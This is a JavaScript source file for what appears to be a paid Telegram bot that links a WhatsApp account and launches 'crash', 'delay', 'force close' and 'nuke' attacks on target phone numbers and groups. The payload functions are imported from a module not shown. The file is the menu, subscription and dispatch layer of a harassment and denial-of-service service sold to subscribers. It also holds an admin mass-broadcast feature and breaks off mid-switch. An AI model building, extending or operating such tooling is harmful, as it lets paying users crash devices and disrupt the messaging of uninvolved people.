require('./config.js');
const { Bot, InlineKeyboard, session, InputFile } = require('grammy');
const { connectToWhatsApp } = require('./connection');
const { db, newClieNt, connectUpload, updateConnectText, updateReagiu, searchClient, getAllClients } = require('./db');
const { checkMember } = require('./channel');
const { limparArquivosSession } = require('./clear.js')
const { generateWAMessageFromContent, getAggregateVotesInPollMessage, downloadContentFromMessage, useMultiFileAuthState, encodeSignedDeviceIdentity, generateWAMessage, makeInMemoryStore, DisconnectReason, areJidsSameUser, getContentType, decryptPollVote, jidDecode, Browsers, proto, generateMessageID, S_WHATSAPP_NET, generateMessageTag, prepareWAMessageMedia, downloadMediaMessage, getTypeMessage } = require("@whiskeysockets/baileys");
const fs = require('fs')
const usersFile = "./telegram_users.json";
let tgUsers = JSON.parse(fs.readFileSync(usersFile));
const path = require('path');
const moment = require('moment-timezone');
const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
const { timefunction, sleep, fetchJson } = require('./lib/simple.js')
const { crashiOsFunction, delayAndroidFunction, crashGroupFunction, FcContacNewFunction, crashGroup2Function, forceOpFunction, nukeFunction, nuke2Function, inviteFunction, bugbuttonFunction, cartFunction, sistemFunction, sistem2Function, crashmsgFunction, callCrashvvFunction, callCrashFunction, delaymaxFunction, galaxyFunction } = require('./lib/await.js')
const sqlite3 = require('sqlite3').verbose();
const bot = new Bot(global.TELEGRAM_TOKEN);
const RESET = '\x1b[0m';
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const used = process.memoryUsage();

const bytesToSize = (bytes) => {
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  if (bytes === 0) return '0 Byte';
  const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)), 10);
  return `${Math.round(bytes / Math.pow(1024, i), 2)} ${sizes[i]}`
};

const ADMIN_ID = 8340001317;
bot.command("sub", async (ctx) => {
    const userId = ctx.from.id.toString();
    const expiry = tgUsers.users[userId];

    if (!expiry) return ctx.reply("You are not a subscriber🏴‍☠️");

    ctx.reply(`🩸Your subscription is valid until: ${expiry}`);
});
bot.command("add", async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;

    const args = ctx.message.text.split(" ");
    const userId = args[1];
    const days = Number(args[2]);

    if (!userId || !days) {
        return ctx.reply("use:\n/add USER_ID DAYS");
    }

    const expiry = new Date();
    expiry.setDate(expiry.getDate() + days);

    tgUsers.users[userId] = expiry.toISOString().split("T")[0];

    fs.writeFileSync(usersFile, JSON.stringify(tgUsers, null, 2));

    ctx.reply(
        `Subscription activated successfully🩸\n` +
        `🏴‍☠️ ID: ${userId}\n` +
        `🩸Duration: ${days} Days`
    );
});
bot.use(async (ctx, next) => {
    if (!ctx.from) return;

    const userId = ctx.from.id.toString();
    const expiry = tgUsers.users[userId];

    if (!expiry) {
        await ctx.reply(
            "You are not allowed to use the bot because it is paid.🩸\n\n" +
            "You must subscribe 🏴‍☠️\n" +
            "Contact: @PFO9T🩸"
        );
        return;
    }

    const now = new Date();
    const endDate = new Date(expiry);

    if (now > endDate) {
        await ctx.reply(
            "Your subscription has expired🩸 \n\n" +
            "Renew your subscription to allow you to use the bot. 🏴‍☠️"
        );
        return;
    }

    await next();
});
bot.use(session({
  initial: () => ({
    step: null,
    sock: null,
    connected: false,
    selectedGroupId: null
  })
}));

bot.on("message:photo", async (ctx) => {
  if (ctx.chat?.id !== 8340001317) return;
  await ctx.reply(`${ctx.message.message_id}`);
});

bot.on("message:video", async (ctx) => {
  if (ctx.chat?.id !== 8340001317) return;
  await ctx.reply(`${ctx.message.message_id}`);
});

bot.on("message:sticker", async (ctx) => {
  if (ctx.chat?.id !== 8340001317) return;
  await ctx.reply(`${ctx.message.message_id}`);
});

bot.on("channel_post", async (ctx) => {
  const chat = ctx.chat;
  const post = ctx.channelPost;
  console.log("📢 منشور تم استلامه من القناة:");
  console.log("🆔 ID do canal:", chat.id);
  console.log("🆔 ID da mensagem:", post.message_id);
});

bot.on('message:text', async (ctx) => {
    const from = ctx?.chat?.id;
  const texto = ctx?.message?.text;
  const pushname = ctx?.from?.username || ctx?.from?.first_name || '';
  const sobrenome = ctx?.from?.last_name || '';
  //const from = ctx?.chat?.id;
  const language = ctx?.from?.language_code;

  console.log(`╭───────────────────────────────
│〔 ${RED}CHAT${RESET} 〕: ${YELLOW}${from}${RESET}
│〔 ${RED}MENSAGEM${RESET} 〕: ${GREEN}${texto}${RESET}
│〔 ${RED}NOME${RESET} 〕: ${GREEN}${pushname} ${sobrenome}${RESET}
│〔 ${RED}LINGUAGEM${RESET} 〕: ${GREEN}${language}${RESET}
│〔 ${RED}iD${RESET} 〕: ${GREEN}${ctx.message.message_id}${RESET}
╰───────────────────────────────`);
  if (String(from).includes('-')) { return; }
  newClieNt(pushname, from, data, hora, '', '0', '0', '0')

  const step = ctx.session.step;
  const text = ctx.message.text;
  const args = text.trim().split(/\s+/).slice(1);
  const q = args.join(" ");
  const numi = text.replace(/\D/g, '') + '@s.whatsapp.net'
  const startTime = Date.now();
  const endTime = Date.now();
  const latencia = endTime - startTime;
  const clientSearch = await searchClient(from)
  limparArquivosSession()
  isMember = await checkMember(from);
  if (!isMember) {
    return ctx.reply('You are not a member of the channel. To use the bot, you must subscribe to the following channels:', {
      reply_markup: {
        inline_keyboard: [
          [{ text: global.button.check, url: 'https://t.me/MAIKYXSPAM' }],
          [{ text: global.button.check2, url: 'https://t.me/MAIKYXSPAM' }], 
          [{ text: global.button.check3, url: 'https://t.me/MAIKYXSPAM' }], 
          [{ text: "𝗖𝗛𝗘𝗖𝗞🏴‍☠️", callback_data: "check_sub" }]
        ]
      }
    });
  }
  async function checkSub(ctx) {
  try {
    for (let ch of global.forceSub.channels) {
      const member = await ctx.api.getChatMember(ch, ctx.from.id)
      if (
        member.status === "left" ||
        member.status === "kicked"
      ) return false
    }
    return true
  } catch {
    return false
  }
}
 
  if (fs.existsSync(checkBanned = path.join(__dirname, './chats.json'))) {
    listaChats = JSON.parse(fs.readFileSync(checkBanned = path.join(__dirname, './chats.json'), 'utf-8'));
    if (Array.isArray(listaChats) && listaChats.includes(from.toString())) {
      return ctx.reply(`🚫 <b>تم حظرك نهائياً من استخدام البوت..</b>\n\n` +
        `إذا كنت تعتقد أن هذا خطأ أو ترغب في تقديم استئناف، فيرجى الاتصال بالدعم أدناه. `, {
        parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: global.button.suporte, url: 'https://t.me/z_z_a' }]] }
      });
    }
  }

  switch (step) {
      
    case 'awaiting_phone':
      if (!text.trim().includes("+")) {
        return ctx.reply("يرجى نسخ رقمك ولصقه بالصيغة الدولية..", { parse_mode: 'HTML' });
      }
      const numero = text.replace(/[^\d]/g, '')
      try {
        fs.rmSync('./lib/session/' + numero, { recursive: true, force: true });
      } catch (e) { }
      await connectToWhatsApp(ctx, numero);
      ctx.reply(`Your code: <code>${global.pairing_code?.match(/.{1,4}/g)?.join("-") || global.pairing_code}</code>\n
<pre><code class="XSPAM">🏴‍☠️If you do not receive a notification, follow these steps: 
╭┄┄┄┄┄
╏🩸 On the WhatsApp home screen, tap the three dots in the upper right corner. 
╏🩸 Select linked devices .
╏🩸 Click to connect the device .
╏🩸 Scroll down and click on "phone number". 
╏🩸 Paste the 8-character code mentioned above. 
╰┄┄┄┄┄</code></pre><a href="https://j.top4top.io/p_3676umwh41.jpg">&#8203;</a>\n`, { parse_mode: 'HTML' });
      ctx.session.step = null;
      break;

    case 'awaiting_number_to_crashios':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      crashiOsFunction(ctx, text, numi)
      break;

      case 'awaiting_number_to_callCrash':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      callCrashFunction(ctx, text, numi)
      break;
    
          
       case 'awaiting_number_to_callCrashvv':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      callCrashvvFunction(ctx, text, numi)
      break;  
          
case 'awaiting_number_to_crashmsg':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      crashmsgFunction(ctx, text, numi)
      break;
      case 'awaiting_number_to_fccontacnew':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      FcContacNewFunction(ctx, text, numi)
      break;
      
      
    case 'awaiting_number_to_delay':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
          delaymaxFunction(ctx, text, numi)
      delayAndroidFunction(ctx, text, numi)    
      break;

    case 'awaiting_number_to_invite':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      inviteFunction(ctx, text, numi)
      break;

    case 'awaiting_number_to_bugbutton':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      bugbuttonFunction(ctx, text, numi)
      break;

    case 'awaiting_number_to_cart':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      cartFunction(ctx, text, numi)
      break;

    case 'awaiting_number_to_sistem':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      sistemFunction(ctx, text, numi)
      break;

    case 'awaiting_number_to_sistem2':
      if (!ctx.session.sock) {
        return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
      }
      sistem2Function(ctx, text, numi)
      break;

    default:
      if (texto.startsWith('/start')) {
    if (clientSearch && clientSearch.conectado === '1') {         
    if (!ctx.session.sock) {
            connectToWhatsApp(ctx, clientSearch.numero);
          }
          const keyboard = new InlineKeyboard()
            .text(global.button.callCrashvv, 'callCrashvv')
            .text(global.button.callCrash, 'callCrash')
            .row()
            .text(global.button.fccontacnewz, 'fccontacnewz')
            .text(global.button.crashmsg, 'crashmsg')
            .row()
            .text(global.button.crash_iphone, 'crash_iphone')
            .text(global.button.trava_atraso, 'trava_atraso')
            .row()
            .text(global.button.crash_grupo, 'crash_grupo')
            .text(global.button.crash_grupo2, 'crash_grupo2')
            .row()
            .text(global.button.forceop, 'force_op')
            .row()
            .text(global.button.nuke, 'nuke')
            .text(global.button.nuke2, 'nuke2')
            .row()
            .text(global.button.disconnect, 'disconnect')
            .row()
            .text(global.button.atualizar, 'menu_cmd');
          ctx.reply(global.text.start({
            clientnumber: clientSearch.numero,
            pushname: pushname
          }), {
            parse_mode: 'HTML',
            reply_markup: keyboard
          });
        } else {
          newClieNt(pushname, from, data, hora, '', '0', '0', '0')
          ctx.reply(global.text.menu({
            userId: from,
            language,
            pushname,
            sobrenome,
            latencia,
            used,
            bytesToSize
          }), { parse_mode: 'HTML', reply_markup: { inline_keyboard: global.replyButton.menu } });
        }
        break
      }

      if (texto.startsWith('/listpop')) {
        if (ctx.chat?.id !== 8340001317) return;
        fs.readdir(path.join(__dirname, 'lib', 'session'), { withFileTypes: true }, (err, files) => {
          if (err) {
            console.error('Erro ao ler a pasta session:', err);
            return;
          }
          const folders = files.filter(dirent => dirent.isDirectory());
          ctx.reply(` ' total de clientes ativo: ${folders.length}`);
        });
        break
      }

      if (texto.startsWith('/msg')) {
        if (ctx.chat?.id !== 8340001317) return;
        const conteudo = texto.slice(4).trim();
        if (!conteudo.includes(',')) {
          return ctx.reply('Formato incorreto. Use: /msg ID,mensagem');
        }
        const [idStr, ...mensagemArray] = conteudo.split(',');
        const idOriginal = idStr.trim();
        const mensagem = mensagemArray.join(',').trim();
        if (!idOriginal || !mensagem) {
          return ctx.reply('ID ou mensagem inválidos.');
        }
        const id1 = Number(idOriginal);
        const id2 = Number(idOriginal + '.0');
        try {
          await ctx.api.sendMessage(id1, mensagem);
          await ctx.reply(`Mensagem enviada para ID: ${id1}`);
        } catch (err1) {
          console.warn(`Erro ao enviar para ${id1}, tentando com ${id2}...`);
          try {
            await ctx.api.sendMessage(id2, mensagem);
            await ctx.reply(`Mensagem enviada para ID: ${id2}`);
          } catch (err2) {
            console.error('حدث خطأ أثناء إرسال الرسالة:', err2.description);
            await ctx.reply('❌ خطأ: تعذر إرسال الرسالة إلى المعرف الأصلي أو المعرف المصحح..');
          }
        }
      }

      if (texto.startsWith('/t')) {
        await ctx.api.forwardMessage(from, from, q);
      }

      if (texto.startsWith('/sendAviso')) {
        if (ctx.chat?.id !== 8340001317) return;
        try {
          const db = new sqlite3.Database('./lib/db/clientes.db', sqlite3.OPEN_READWRITE, (err) => {
            if (err) {
              console.error('حدث خطأ أثناء فتح قاعدة البيانات.:', err.message);
              return;
            }
          });
          let sentUserIds = [];
          let failedUserIds = [];
          db.all('SELECT from_id FROM clientes', [], async (err, rows) => {
            if (err) {
              console.error('Erro ao consultar o banco de dados:', err.message);
              db.close();
              return;
            }
            try {
              for (let row of rows) {
                try {
                  console.log(`\x1b[31m[ AVISO ]\x1b[0m \x1b[32mEnviando mensagem para:\x1b[0m => ${row.from_id}`);
                  await ctx.api.forwardMessage(row.from_id, from, q);
                  sentUserIds.push(row.from_id);
                } catch (error) {
                  failedUserIds.push(row.from_id);

                  if (error.error_code === 403) {
                    console.log(`\x1b[31m[ BLOQUEADO ]\x1b[0m O usuário bloqueou o bot: ${row.from_id}`);
                    db.run('DELETE FROM clientes WHERE from_id = ?', [row.from_id]);
                  } else {
                    console.error(`\x1b[31m[ ERRO ]\x1b[0m Falha ao enviar para ${row.from_id}:`, error.message);
                  }
                }
                await new Promise(res => setTimeout(res, 1));
              }
              const sentMessage = sentUserIds.length > 0
                ? `✅ تم إرسال الرسالة بنجاح إلى:: ${sentUserIds.length} المستخدمون.\n فشل لـ:: ${failedUserIds.length}.`
                : '⚠️ لم يتلق أي مستخدم الرسالة..';
              try {
                await ctx.reply(sentMessage, {
                  reply_markup: {
                    inline_keyboard: [[{ text: global.button.apagar, callback_data: "null" }]]
                  }
                });
              } catch (replyError) {
                console.error('Erro ao enviar mensagem de status:', replyError.message);
              }
            } catch (loopError) {
              console.error('Erro durante o loop de envio:', loopError.message);
            } finally {
              db.close((err) => {
                if (err) console.error('Erro ao fechar o banco de dados:', err.message);
              });
            }
          });
        } catch (outerError) {
          console.error('Erro inesperado ao executar /sendAviso:', outerError.message);
        }
        break;
      }
  }
});

bot.on('callback_query:data', async (ctx) => {
  try {
    const date = ctx.callbackQuery.data;
    const startTime = Date.now();
    const userId = ctx.from?.id;
    const from = ctx.from?.id;
    const language = ctx.from?.language_code;
    const pushname = ctx.from?.username || ctx.from?.first_name || '';
    const sobrenome = ctx.from?.last_name || '';
    const endTime = Date.now();
    const latencia = endTime - startTime;
    const clientSearch = await searchClient(from)
    limparArquivosSession()
    isMember = await checkMember(from);
    if (!isMember) {
      return ctx.reply('You are not a member of the channels; to use the bot you must subscribe to the channels:', {
        reply_markup: {
          inline_keyboard: [
            [{ text: global.button.check, url: 'https://t.me/MAIKYXSPAM' }],
            [{ text: global.button.check2, url: 'https://t.me/MAIKYXSPAM' }]
          ]
        }
      });
    }
    console.log(`╭───────────────────────────────
│〔 ${RED}CHAT${RESET} 〕: ${YELLOW}${from}${RESET}
│〔 ${RED}MENSAGEM${RESET} 〕: ${GREEN}${date}${RESET}
│〔 ${RED}NOME${RESET} 〕: ${GREEN}${pushname} ${sobrenome}${RESET}
│〔 ${RED}LINGUAGEM${RESET} 〕: ${GREEN}${language}${RESET}
╰───────────────────────────────`);
    newClieNt(pushname, from, data, hora, '', '0', '0', '0')
    try {
      await ctx.deleteMessage();
    } catch (e) { }
    try {
      await ctx.answerCallbackQuery();
    } catch (e) { }

    if (fs.existsSync(checkBanned = path.join(__dirname, './chats.json'))) {
      listaChats = JSON.parse(fs.readFileSync(checkBanned = path.join(__dirname, './chats.json'), 'utf-8'));
      if (Array.isArray(listaChats) && listaChats.includes(from.toString())) {
        return ctx.reply(`🚫 <b>تم حظرك نهائياً من استخدام البوت..</b>\n\n` +
          `إذا كنت تعتقد أن هذا خطأ أو ترغب في تقديم استئناف، فيرجى الاتصال بالدعم أدناه.`, {
          parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: global.button.suporte, url: 'https://t.me/PFO9T' }]] }
        });
      }
    }

    switch (date) {

      case 'menu':
        ctx.reply(global.text.menu({
          userId,
          language,
          pushname,
          sobrenome,
          latencia,
          used,
          bytesToSize
        }), {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: global.replyButton.menu
          }
        });
        break;
case 'crash_iphone':
        if (!ctx.session.sock) { return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } }); }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_crashios';
        break;
            
        case 'callCrash':
        if (!ctx.session.sock) { return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } }); }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_callCrash';
        break;    
            
      case 'fccontacnewz':
        if (!ctx.session.sock) { return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } }); }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_fccontacnew';
        break;
     case 'crashmsg':
        if (!ctx.session.sock) { return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } }); }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_crashmsg';
        break;   
case 'callCrashvv':
        if (!ctx.session.sock) { return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } }); }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_callCrashvv';
        break;   
      case 'trava_convite':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
        }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_invite';
        break;

      case 'trava_bugbutton':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
        }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_bugbutton';
        break;

      case 'trava_carrinho':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
        }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_cart';
        break;

      case 'trava_sistema':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
        }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_sistem';
        break;

      case 'trava_sistema2':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
        }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_sistem2';
        break;

      case 'trava_atraso':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]] } });
        }
        ctx.reply(`<b>${global.text.send_number}</b>`, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_number_to_delay';
        break;

      case 'trava_android':
        if (clientSearch.conectado === '1') {
          if (!ctx.session.sock) {
            connectToWhatsApp(ctx, clientSearch.numero);
          }
          const keyboard = new InlineKeyboard()
            .text(global.button.callCrashvv, 'callCrashvv')
            .row()
            .text(global.button.trava_sistema, 'trava_sistema')
            .text(global.button.trava_sistema2, 'trava_sistema2')
            .row()
            .text(global.button.trava_convite, 'trava_convite')
            .row()
            .text(global.button.trava_carrinho, 'trava_carrinho')
            .row()
            .text(global.button.trava_atraso, 'trava_atraso')
            .row()
            .text(global.button.voltar, 'menu_cmd');
          ctx.reply(`<a href="https://files.catbox.moe/12zy7y.jpg">&#8203;</a>
<blockquote><b>:حدد نوع الخطأ الذي تريد الإبلاغ عنه.</b></blockquote>
<blockquote><b>حدد نوع الخطأ الذي تريد الإبلاغ عنه:</b></blockquote>
`, {
            parse_mode: 'HTML',
            reply_markup: keyboard
          });
        }
        break

      case 'menu_cmd':
        if (clientSearch.conectado === '1') {
          if (!ctx.session.sock) {
            connectToWhatsApp(ctx, clientSearch.numero);
          }
          const keyboard = new InlineKeyboard()
            .text(global.button.callCrashvv, 'callCrashvv')
            .text(global.button.callCrash, 'callCrash')
            .text(global.button.crashmsg, 'crashmsg')
            .row()
            .text(global.button.trava_atraso, 'trava_atraso')
            .row()
            .text(global.button.crash_iphone, 'crash_iphone')
          .text(global.button.fccontacnewz, 'fccontacnewz')
            .row()
            .text(global.button.crash_grupo, 'crash_grupo')
            .text(global.button.crash_grupo2, 'crash_grupo2')
            .row()
            .text(global.button.forceop, 'force_op')
            .row()
            .text(global.button.nuke, 'nuke')
            .text(global.button.nuke2, 'nuke2')
            .row()
            .text(global.button.disconnect, 'disconnect')
            .row()
            .text(global.button.atualizar, 'menu_cmd');
          ctx.reply(global.text.start({
            clientnumber: clientSearch.numero,
            pushname: pushname
          }), {
            parse_mode: 'HTML',
            reply_markup: keyboard
          });
        } else {
          newClieNt(pushname, from, data, hora, '', '0', '0', '0')
          ctx.reply(global.text.menu({
            userId: from,
            language,
            pushname,
            sobrenome,
            latencia,
            used,
            bytesToSize
          }), { parse_mode: 'HTML', reply_markup: { inline_keyboard: global.replyButton.menu } });
        }
        break;

      case 'disconnect':
        infoUser = await searchClient(from)
        if (ctx.session.sock) {
          ctx.session.sock.ws.removeAllListeners();
          ctx.session.sock.end();
          ctx.session.sock = null;
          ctx.session.connected = false;
          connectUpload(from, '', '0')
          updateConnectText(from, '0')
          ctx.reply('✅')
        } else {
          ctx.session.sock = null;
          ctx.session.connected = false;
          connectUpload(from, '', '0')
          updateConnectText(from, '0')
          ctx.reply('✅')
        }
        break

      case 'pairing':
        ctx.reply(global.text.enter_phone, { parse_mode: 'HTML' });
        ctx.session.step = 'awaiting_phone'; 
    break;

// مثال لدالة بسيطة تشيك في ملف JSON
function checkUserInFile(telegramId) {
    const fs = require('fs');
    const users = JSON.parse(fs.readFileSync('./users.json', 'utf8'));
    return users.some(user => user.telegramId === telegramId);
}
      case 'force_op':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]]
            }
          });
        }
        try {
          groups = await ctx.session.sock.groupFetchAllParticipating();
          groupInfo = Object.entries(groups).map(([id, group]) => {
            return { id, name: group.subject };
          }).slice(0, 19);

          if (groupInfo.length > 0) {
            keyboard = { inline_keyboard: [] };
            groupInfo.forEach(group => {
              keyboard.inline_keyboard.push([{ text: group.name, callback_data: `send_crashgp_${group.id}` }]);
            });
            keyboard.inline_keyboard.push([{ text: global.button.voltar, callback_data: 'menu_cmd' }]);
            ctx.reply(global.text.select_group, { parse_mode: 'HTML', reply_markup: keyboard });
            ctx.session.groups = groupInfo;
          } else {
            ctx.reply(global.text.no_groups, { parse_mode: 'HTML' });
          }
        } catch (e) {
          console.log(e);
          ctx.reply(global.text.message_error, { parse_mode: 'HTML' });
        }
        break;

      case 'crash_grupo':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]]
            }
          });
        }
        try {
          const groups = await ctx.session.sock.groupFetchAllParticipating();
          let groupInfo = Object.entries(groups).map(([id, group]) => {
            return { id, name: group.subject };
          }).slice(0, 19);
          if (groupInfo.length > 0) {
            const keyboard = { inline_keyboard: [] };
            groupInfo.forEach(group => {
              keyboard.inline_keyboard.push([{ text: group.name, callback_data: `send_crashgp_${group.id}` }]);
            });
            keyboard.inline_keyboard.push([{ text: global.button.voltar, callback_data: 'menu_cmd' }]);
            ctx.reply(global.text.group_crash, { parse_mode: 'HTML', reply_markup: keyboard });
            ctx.session.groups = groupInfo;
          } else {
            ctx.reply(global.text.no_groups, { parse_mode: 'HTML' });
          }
        } catch (e) {
          console.log(e);
          ctx.reply(global.text.message_error, { parse_mode: 'HTML' });
        }
        break;

      case 'crash_grupo2':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]]
            }
          });
        }
        try {
          const groups = await ctx.session.sock.groupFetchAllParticipating();
          let groupInfo = Object.entries(groups).map(([id, group]) => {
            return { id, name: group.subject };
          }).slice(0, 19);
          if (groupInfo.length > 0) {
            const keyboard = { inline_keyboard: [] };
            groupInfo.forEach(group => {
              keyboard.inline_keyboard.push([{ text: group.name, callback_data: `send_crashgp2_${group.id}` }]);
            });
            keyboard.inline_keyboard.push([{ text: global.button.voltar, callback_data: 'menu_cmd' }]);
            ctx.reply(global.text.group_crash, { parse_mode: 'HTML', reply_markup: keyboard });
            ctx.session.groups = groupInfo;
          } else {
            ctx.reply(global.text.no_groups, { parse_mode: 'HTML' });
          }
        } catch (e) {
          console.log(e);
          ctx.reply(global.text.message_error, { parse_mode: 'HTML' });
        }
        break;


      case 'nuke':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]]
            }
          });
        }
        try {
          groupsData = await ctx.session.sock.groupFetchAllParticipating();
          groupEntries = Object.entries(groupsData);
          let groupInfo = groupEntries.map(([id, group]) => {
            participantIds = group.participants.filter(v => v.admin === null).map(v => v.id);
            return { id, name: group.subject, participants: participantIds };
          }).slice(0, 19);

          if (groupInfo.length > 0) {
            keyboard = { inline_keyboard: [] };
            groupInfo.forEach(group => {
              keyboard.inline_keyboard.push([{ text: group.name, callback_data: `send_nuke_${group.id}` }]);
            });
            keyboard.inline_keyboard.push([{ text: global.button.voltar, callback_data: 'menu_cmd' }]);
            ctx.reply(global.text.group_crash, { parse_mode: 'HTML', reply_markup: keyboard });
            ctx.session.groups = groupInfo;
          } else {
            ctx.reply(global.text.no_groups, { parse_mode: 'HTML' });
          }
        } catch (e) {
          console.error(e);
          ctx.reply(global.text.message_error, { parse_mode: 'HTML' });
        }
        break;

      case 'nuke2':
        if (!ctx.session.sock) {
          return ctx.reply(global.text.not_connected, {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[{ text: global.button.voltar, callback_data: 'menu_cmd' }]]
            }
          });
        }
        try {
          groupsData = await ctx.session.sock.groupFetchAllParticipating();
          groupEntries = Object.entries(groupsData);
          let groupInfo = groupEntries.map(([id, group]) => {
            participantIds = group.participants.map(v => v.id);
            return { id, name: group.subject, participants: participantIds };
          }).slice(0, 19); // Limita para 19 grupos

          if (groupInfo.length > 0) {
            keyboard = { inline_keyboard: [] };
            groupInfo.forEach(group => {
              keyboard.inline_keyboard.push([{ text: group.name, callback_data: `send_nuke2_${group.id}` }]);
            });
            keyboard.inline_keyboard.push([{ text: global.button.voltar, callback_data: 'menu_cmd' }]);
            ctx.reply(global.text.group_crash, { parse_mode: 'HTML', reply_markup: keyboard });
            ctx.session.groups = groupInfo;
          } else {
            ctx.reply(global.text.no_groups, { parse_mode: 'HTML' });
          }
        } catch (e) {
          console.error(e);
          ctx.reply(global.text.message_error, { parse_mode: 'HTML' });
        }
        break;


      default:

